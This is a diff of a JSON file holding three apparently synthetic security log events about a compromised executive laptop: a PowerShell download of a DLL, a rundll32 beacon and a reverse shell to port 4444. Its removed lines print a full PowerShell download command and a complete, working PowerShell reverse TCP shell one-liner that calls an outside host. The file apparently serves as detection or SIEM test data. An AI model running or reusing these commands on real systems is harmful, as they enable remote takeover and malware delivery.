@@ -1,46 +1,27 @@
 [{
   "metadata": {
-    "event_timestamp": "2025-12-06T09:00:16.882Z",
+    "event_timestamp": "2025-12-06T09:05:13.882Z",
     "event_type": "NETWORK_HTTP",
     "description": "Outbound HTTP connection detected from PowerShell to external IP 192.0.2.44 downloading executable content (dropper.dll).",
     "product_name": "Google Cloud VPC Flow Logs",
     "vendor_name": "Google Cloud",
-    "product_event_type": "NETWORK_FLOW_LOG",
-    "ingested_timestamp": "2025-12-06T09:00:17.100Z"
+    "product_event_type": "NETWORK_FLOW_LOG"
   },
   "principal": {
-    "user": {
-      "userid": "richard.sterling",
-      "email_addresses": "richard.sterling@grandbank.corp",
-      "windows_sid": "user-sid-12345"
-    },
+    "hostname": "ceo-laptop01.grandbank.corp",
+    "asset_id": "WIN11-LAPTOP-CEODEV-5566",
     "ip": "10.10.22.55",
-    "asset": {
-      "hostname": "ceo-laptop01.grandbank.corp",
-      "asset_id": "WIN11-LAPTOP-CEODEV-5566"
-    },
-    "process": {
-      "command_line": "powershell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri 'https://malicious-update-storage.eastus.cloudapp.azure.com/dropper.dll' -OutFile 'C:\\Users\\richard.sterling\\AppData\\Local\\Temp\\updcore.dll'\"",
-      "file": {
-        "full_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "sha256": "4d7f0c33e84bd7d1f7bbd65fa32a9c53bd627b51e29237b83d8c87910d22f5c6"
-      },
-      "pid": "6344",
-      "parent_process": {
-        "pid": "5520",
-        "file": {
-          "full_path": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe"
-        }
-      }
+    "port": "50432",
+    "user": {
+      "userid": "user-sid-12345",
+      "windows_sid": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
     }
   },
   "target": {
     "ip": "192.0.2.44",
     "port": 443,
     "hostname": "malicious-update-storage.eastus.cloudapp.azure.com",
-    "resource": {
-      "name": "malicious-update-storage.eastus.cloudapp.azure.com/dropper.dll"
-    }
+    "url": "malicious-update-storage.eastus.cloudapp.azure.com/dropper.dll"
   },
   "network": {
     "ip_protocol": "TCP",
@@ -52,13 +33,19 @@
     },
     "dns_domain": "malicious-update-storage.eastus.cloudapp.azure.com",
     "dns": {
-      "questions": {"name": "malicious-update-storage.eastus.cloudapp.azure.com"},
-      "answers": {"data": "192.0.2.44"}
+      "questions": {
+        "name": "malicious-update-storage.eastus.cloudapp.azure.com"
+      },
+      "answers": {
+        "data": "192.0.2.44"
+      }
     },
     "direction": "OUTBOUND",
     "sent_bytes": 875,
     "received_bytes": 514902,
-    "session_duration": {"nano": 420000000},
+    "session_duration": {
+      "nano": 420000000
+    },
     "session_id": "sess1-c4f9a1b2-8d7e-4f6c-b3a5-0e1d2f3c4b5a"
   },
   "security_result": [
@@ -73,8 +60,7 @@
     {
       "file": {
         "display_name": "updcore.dll",
-        "full_path": "C:\\Users\\richard.sterling\\AppData\\Local\\Temp\\updcore.dll",
-        "directory": "C:\\Users\\richard.sterling\\AppData\\Local\\Temp\\",
+        "full_path": "C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll",
         "name": "updcore.dll",
         "size": 514902,
         "sha256": "a3b1c2d4e5f60e9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a",
@@ -85,50 +71,32 @@
       "type": "RESOURCE"
     }
   ]
-},
+}
+,
 {
   "metadata": {
-    "event_timestamp": "2025-12-06T09:00:27.204Z",
+    "event_timestamp": "2025-12-06T09:05:18.000Z",
     "event_type": "NETWORK_HTTP",
-    "description": "Outbound HTTPS C2 beacon detected from Rundll32 executing temporary DLL (updcore.dll) to external telemetry endpoint.",
+    "description": "Outbound HTTPS connection from rundll32.exe to malicious telemetry endpoint.",
     "product_name": "Google Cloud VPC Flow Logs",
     "vendor_name": "Google Cloud",
-    "product_event_type": "NETWORK_FLOW_LOG",
-    "ingested_timestamp": "2025-12-06T09:00:27.450Z"
+    "product_event_type": "NETWORK_FLOW_LOG"
   },
   "principal": {
-    "user": {
-      "userid": "richard.sterling",
-      "email_addresses": "richard.sterling@grandbank.corp",
-      "windows_sid": "user-sid-12345"
-    },
+    "hostname": "ceo-laptop01.grandbank.corp",
+    "asset_id": "WIN11-LAPTOP-CEODEV-5566",
     "ip": "10.10.22.55",
-    "asset": {
-      "hostname": "ceo-laptop01.grandbank.corp",
-      "asset_id": "WIN11-LAPTOP-CEODEV-5566"
-    },
-    "process": {
-      "command_line": "rundll32.exe \"C:\\Users\\richard.sterling\\AppData\\Local\\Temp\\updcore.dll\",EntryPoint",
-      "file": {
-        "full_path": "C:\\Windows\\System32\\rundll32.exe",
-        "sha256": "9c7ca278cee31d2bb2d28a93481a8f7cc80b3c5d88f5eeb47e27f9ef99eabc33"
-      },
-      "pid": "6684",
-      "parent_process": {
-        "pid": "6344",
-        "file": {
-          "full_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-        }
-      }
+    "port": "50438",
+    "user": {
+      "userid": "user-sid-12345",
+      "windows_sid": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
     }
   },
   "target": {
     "ip": "192.0.2.44",
     "port": 443,
     "hostname": "malicious-update-storage.eastus.cloudapp.azure.com",
-    "resource": {
-      "name": "malicious-update-storage.eastus.cloudapp.azure.com/telemetry"
-    }
+    "url": "malicious-update-storage.eastus.cloudapp.azure.com/telemetry"
   },
   "network": {
     "ip_protocol": "TCP",
@@ -136,102 +104,92 @@
     "http": {
       "method": "POST",
       "response_code": 200,
-      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) rundll32/10.0"
     },
     "dns_domain": "malicious-update-storage.eastus.cloudapp.azure.com",
     "dns": {
-      "questions": {"name": "malicious-update-storage.eastus.cloudapp.azure.com"},
-      "answers": {"data": "192.0.2.44"}
+      "questions": {
+        "name": "malicious-update-storage.eastus.cloudapp.azure.com"
+      },
+      "answers": {
+        "data": "192.0.2.44"
+      }
     },
     "direction": "OUTBOUND",
-    "sent_bytes": 1240,
-    "received_bytes": 408,
+    "sent_bytes": 1420,
+    "received_bytes": 9850,
     "session_duration": {
-      "nano": 150000000
+      "nano": 380000000
     },
-    "session_id": "sess1-c4f9a1b2-8d7e-4f6c-b3a5-0e1d2f3c4b5a"
+    "session_id": "sess1-99a4a2b2-3f1d-4d7e-ab2f-0f3e87298c90"
   },
   "security_result": [
     {
       "action": "ALLOW",
       "severity": "HIGH",
       "category": "NETWORK_MALICIOUS",
-      "description": "Traffic detection: Known C2 Beaconing pattern to malicious domain."
+      "description": "Connection to known malicious cloud-hosted telemetry endpoint associated with droppers."
     }
   ],
   "about": [
     {
       "file": {
         "display_name": "updcore.dll",
-        "full_path": "C:\\Users\\richard.sterling\\AppData\\Local\\Temp\\updcore.dll",
-        "directory": "C:\\Users\\richard.sterling\\AppData\\Local\\Temp\\",
+        "full_path": "C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll",
         "name": "updcore.dll",
-        "size": 514902,
-        "sha256": "a3b1c2d4e5f60e9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a",
-        "md5": "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6",
+        "size": 45568,
+        "sha256": "4d7f0c33e84bd7d1f7bbd65fa32a9c53bd627b51e29237b83d8c87910d22f5c6",
+        "md5": "7c6a180b36896a0a8c02787eeafb0e4c",
         "mime_type": "application/x-msdownload",
-        "state": "CREATION"
+        "state": "EXECUTION"
       },
       "type": "RESOURCE"
     }
   ]
-},
+}
+,
 {
   "metadata": {
-    "event_timestamp": "2025-12-06T09:00:35.204Z",
+    "event_timestamp": "2025-12-06T09:05:19.000Z",
     "event_type": "NETWORK_CONNECTION",
-    "description": "Outbound TCP Reverse Shell connection detected on port 4444 initiated by PowerShell.",
+    "description": "Outbound TCP reverse shell connection from PowerShell to C2 server 198.51.100.21:4444.",
     "product_name": "Google Cloud VPC Flow Logs",
     "vendor_name": "Google Cloud",
-    "product_event_type": "NETWORK_FLOW_LOG",
-    "ingested_timestamp": "2025-12-06T09:00:35.500Z"
+    "product_event_type": "NETWORK_FLOW_LOG"
   },
   "principal": {
-    "user": {
-      "userid": "richard.sterling",
-      "email_addresses": "richard.sterling@grandbank.corp",
-      "windows_sid": "user-sid-12345"
-    },
+    "hostname": "ceo-laptop01.grandbank.corp",
+    "asset_id": "WIN11-LAPTOP-CEODEV-5566",
     "ip": "10.10.22.55",
-    "asset": {
-      "hostname": "ceo-laptop01.grandbank.corp",
-      "asset_id": "WIN11-LAPTOP-CEODEV-5566"
-    },
-    "process": {
-      "command_line": "powershell.exe -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('198.51.100.21',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"",
-      "file": {
-        "full_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "sha256": "b7a2c9d47f0e9c6a3b5d4e2f1c0b9a8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b"
-      },
-      "pid": "7744",
-      "parent_process": {
-        "pid": "6684",
-        "file": {
-          "full_path": "C:\\Windows\\System32\\rundll32.exe"
-        }
-      }
+    "port": "50455",
+    "user": {
+      "userid": "user-sid-12345",
+      "windows_sid": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
     }
   },
   "target": {
     "ip": "198.51.100.21",
-    "port": 4444
+    "port": 4444,
+    "hostname": "198.51.100.21",
+    "url": "198.51.100.21:4444"
   },
   "network": {
     "ip_protocol": "TCP",
+    "application_protocol": "TCP",
     "direction": "OUTBOUND",
-    "sent_bytes": 4500,
-    "received_bytes": 12050,
+    "sent_bytes": 2345,
+    "received_bytes": 12890,
     "session_duration": {
-      "nano": 900000000
+      "nano": 550000000
     },
-    "session_id": "sess1-c4f9a1b2-8d7e-4f6c-b3a5-0e1d2f3c4b5a"
+    "session_id": "sess1-7744-c2-198-51-100-21"
   },
   "security_result": [
     {
-      "action": "CRITICAL",
-      "severity": "HIGH",
+      "action": "BLOCK",
+      "severity": "CRITICAL",
       "category": "NETWORK_COMMAND_AND_CONTROL",
-      "description": "Traffic detection: PowerShell Reverse TCP Shell to external IP."
+      "description": "Detected connection to known C2 server; reverse shell activity from PowerShell."
     }
   ]
 }
